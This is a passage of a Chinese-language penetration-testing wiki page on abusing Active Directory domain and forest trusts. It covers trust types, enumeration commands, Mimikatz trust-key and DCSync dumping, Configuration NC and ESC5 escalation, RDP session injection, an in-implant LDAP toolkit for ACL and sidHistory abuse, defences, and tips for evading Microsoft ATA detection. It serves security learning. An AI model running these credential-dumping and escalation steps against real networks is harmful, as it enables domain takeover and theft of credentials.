1. **Domain 1** 中的客户端计算机使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**。
2. 如果客户端认证成功，DC1 会签发新的 TGT。
3. 客户端随后向 DC1 请求一个**inter-realm TGT**，该票据用于访问 **Domain 2** 的资源。
4. inter-realm TGT 使用作为双向域信任一部分的 DC1 与 DC2 之间共享的**trust key** 加密。
5. 客户端将 inter-realm TGT 提交给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT，若有效，则为客户端欲访问的 Domain 2 中的服务器签发 **Ticket Granting Service (TGS)**。
7. 最后，客户端向服务器出示该 TGS（该票据用服务器账户的 hash 加密），以获取对 Domain 2 中服务的访问。

### Different trusts

需要注意的是，**信任可以是单向或双向的**。在双向信任中，两个域会相互信任；而在**单向**信任关系中，一个域为 **trusted**，另一个为 **trusting**。在后一种情况下，**你只能从被信任域访问信任域内的资源**。

如果 Domain A 信任 Domain B，则 A 为 trusting 域，B 为 trusted 域。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**不同的信任关系**

- **Parent-Child Trusts**：这是同一 forest 内常见的设置，子域自动与其父域建立双向传递信任。实质上，这意味着认证请求可以在父域和子域之间无缝流动。
- **Cross-link Trusts**：称为“shortcut trusts”，它们在子域之间建立以加速引用过程。在复杂的 forest 中，认证引用通常需要上行至 forest 根再下行至目标域。创建 cross-links 可缩短此过程，尤其适用于地理分散的环境。
- **External Trusts**：这些在不同且不相关的域之间建立，具有非传递性。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，当需要访问当前 forest 之外且未通过 forest trust 连接的域中的资源时，external trusts 是有用的。通过 SID 过滤来增强 external trusts 的安全性。
- **Tree-root Trusts**：这些信任在 forest 根域与新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对向 forest 添加新的域树很重要，使其能保持唯一的域名并确保双向传递性。更多信息见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：此类信任是两个 forest 根域之间的双向传递信任，同时也强制执行 SID 过滤以增强安全性。
- **MIT Trusts**：这些信任与非 Windows 的、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更为专业，适用于需要与 Windows 生态外的 Kerberos 基于系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系还可以是**传递的**（A 信任 B，B 信任 C，则 A 信任 C）或**非传递的**。
- 信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（仅一方信任另一方）。

### Attack Path

1. **枚举**信任关系
2. 检查是否有任何**安全主体**（user/group/computer）对**另一个域**的资源有**访问权限**，可能通过 ACE 条目或成为另一个域的组成员。寻找**跨域关系**（信任通常是为此而创建）。
1. 在这种情况下 kerberoast 也可能是另一个选项。
3. **攻破**可以**穿越域**的**账户**。

攻击者可通过三种主要机制访问另一个域的资源：

- **本地组成员资格**：主体可能被添加到机器上的本地组，例如服务器的 “Administrators” 组，从而获得对该机器的重大控制权。
- **外域组成员资格**：主体也可以是外域内某些组的成员。然而，此方法的有效性取决于信任的性质和组的作用域。
- **访问控制列表 (ACLs)**：主体可能被列在 **ACL** 中，特别是在 **DACL** 的 **ACE** 中作为实体，从而为其提供对特定资源的访问。想深入了解 ACL、DACL 和 ACE 机制的人，可参考题为 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 的白皮书。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域内的 foreign security principals。这些将来自**外部域/林**的用户/组。

你可以在 **Bloodhound** 中检查，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方式：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 trusted keys**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以用以下命令查看当前域使用的是哪个：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

通过滥用信任并使用 SID-History injection，将 Enterprise admin 提权到子域/父域：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何利用 Configuration Naming Context (NC) 非常关键。Configuration NC 在 Active Directory (AD) 林中作为配置数据的集中存储库。该数据会复制到林中每个 Domain Controller (DC)，可写的 DC 会保留 Configuration NC 的可写副本。要利用这一点，必须在某台 DC 上拥有 **SYSTEM privileges on a DC**，最好是子 DC。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含关于 AD 林中所有域联入计算机站点的信息。通过在任一 DC 上以 SYSTEM 权限操作，攻击者可以将 GPO 链接到 root DC site，从而通过操纵应用于这些站点的策略可能破坏根域。

有关深入信息，可参考研究 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)。

**Compromise any gMSA in the forest**

一种攻击向量是针对域内的特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。只要在任一 DC 上拥有 SYSTEM 权限，就可以访问 KDS Root key 并计算林中任意 gMSA 的密码。

详细分析与分步指导可见于：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor —— 滥用 migration attributes）:


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

额外外部研究：[Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

此方法需要耐心，等待新的特权 AD 对象创建。获得 SYSTEM 权限后，攻击者可以修改 AD Schema，授予任意用户对所有类的完全控制权限，从而对新创建的 AD 对象获得未授权访问和控制。

更多阅读请见 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 PKI 对象的控制，以创建允许以林中任意用户身份进行身份验证的证书模板。由于 PKI 对象位于 Configuration NC 中，妥协一个可写的子 DC 即可执行 ESC5 攻击。

更多细节见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的场景下，攻击者也可以搭建必要组件，详见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中，**你的域受到外部域的信任**，因此对方赋予你对其的**不确定权限**。你需要找出**你域中的哪些主体对外部域拥有哪些访问权限**，然后尝试加以利用：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在这种场景中，**你的域** 正在 **信任** 来自 **不同域** 的主体（principal）若干 **权限**。

然而，当一个 **域被信任域所信任** 时，受信任域会 **创建一个用户**，该用户具有 **可预测的名称**，并将 **受信任密码作为该用户的密码**。这意味着可以 **使用来自信任域的用户访问受信任域，从而进入受信任域** 对其进行枚举并尝试提升更多权限：

{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种攻破受信任域的方法是发现一个在域信任的**相反方向**上创建的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种攻破受信任域的方法是在一台机器上等待一个**来自受信任域的用户可以通过 RDP 访问**并登录。然后，攻击者可以在 RDP 会话进程中注入代码，并从那里 **访问受害者的原始域**。\
此外，如果**受害者挂载了他的硬盘**，攻击者可以从 **RDP 会话** 进程在硬盘的 **启动文件夹** 中存放 **backdoors**。该技术称为 **RDPInception.**

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解

### **SID Filtering:**

- 利用 SID history 属性跨林信任发起的攻击风险可以通过 SID Filtering 缓解，SID Filtering 在所有跨林（inter-forest）信任上默认启用。这建立在微软认为以 forest（林）而非 domain（域）作为安全边界，因而假定林内（intra-forest）信任是安全的前提之上。
- 不过有个问题：SID filtering 可能会影响应用程序和用户访问，因此有时会被禁用。

### **Selective Authentication:**

- 对于跨林信任，使用 Selective Authentication 可确保来自两个林的用户不会被自动认证，而是需要明确授权，才能访问信任域或林内的域与服务器。
- 需要注意的是，这些措施并不能防止对可写的 Configuration Naming Context (NC) 的利用，也不能防范针对信任帐户的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP 原语重新实现为在宿主端 implant（例如 Adaptix C2）内完全运行的 x64 Beacon Object Files。操作人员通过 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都使用当前登录的安全上下文通过 LDAP (389)（带 signing/sealing）或 LDAPS (636)（自动信任证书），因此不需要 socks 代理或磁盘痕迹。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将短名/OU 路径解析为完整的 DNs 并转储相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 提取任意属性（包括安全描述符），并从 `rootDSE` 拉取 forest/domain 元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露 roasting candidates、delegation 设置和已有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` and `get-writable --detailed` 解析 DACL，列出受托人（trustees）、权限（如 GenericAll/WriteDACL/WriteOwner/属性写入）及继承信息，直接给出用于 ACL 提权的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提权与持久化

- 对象创建 BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作员在有 OU 权限的位置安置新的主体或机器账户。`add-groupmember`, `set-password`, `add-attribute`, 和 `set-attribute` 一旦发现 write-property 权限，就可以直接劫持目标。
- 聚焦 ACL 的命令，例如 `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, 和 `add-dcsync` 将任何 AD 对象上的 WriteDACL/WriteOwner 转换为密码重置、群组成员控制或 DCSync 复制权限，且不会留下 PowerShell/ADSI 工具痕迹。`remove-*` 对应命令可清理注入的 ACE。

### 委派、roasting 与 Kerberos 滥用

- `add-spn`/`set-spn` 立即使被妥协的用户变为 Kerberoastable；`add-asreproastable`（UAC 切换）将其标记为可 AS-REP roasting，而无需修改密码。
- 委派宏（`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD 攻击路径，并消除了对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SIDs 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的权限继承。
- `move-object` 更改计算机或用户的 DN/OU，允许攻击者在滥用 `set-password`, `add-groupmember`, 或 `add-spn` 之前将资产拖入已有委派权限的 OU。
- 作用域严格的移除命令（`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, 等）允许在操作员窃取凭证或建立持久化后快速回滚，最小化遥测痕迹。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **凭证保护的防御措施**

- **Domain Admins Restrictions**: 建议 Domain Admins 仅被允许登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account Privileges**: 服务不应使用 Domain Admin (DA) 权限运行以维持安全。
- **Temporal Privilege Limitation**: 对于需要 DA 权限的任务，应限制其持续时间。可通过： `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: 审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **实施欺骗技术**

- 实施欺骗包括设置陷阱，例如诱饵用户或计算机，具有密码不再过期或被标记为 Trusted for Delegation 等特征。详细方法包括创建具有特定权限的用户或将其添加到高权限组。
- 一个实用示例包括使用如下命令： `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 关于部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **识别欺骗**

- **对于用户对象**：可疑指标包括异常的 ObjectSID、很少的登录、创建日期，以及较低的 bad password 计数。
- **一般指标**：比较潜在诱饵对象与真实对象的属性可以发现不一致之处。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别这些欺骗。

### **规避检测系统**

- **Microsoft ATA Detection Bypass**:
- **用户枚举**：避免在 Domain Controllers 上进行会话枚举以防触发 ATA 检测。
- **票据伪装**：使用 **aes** 密钥创建票据有助于规避检测，因为不会降级到 NTLM。
- **DCSync 攻击**：建议从非 Domain Controller 执行以避免 ATA 检测，因为直接从 Domain Controller 执行会触发告警。

## 参考资料

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
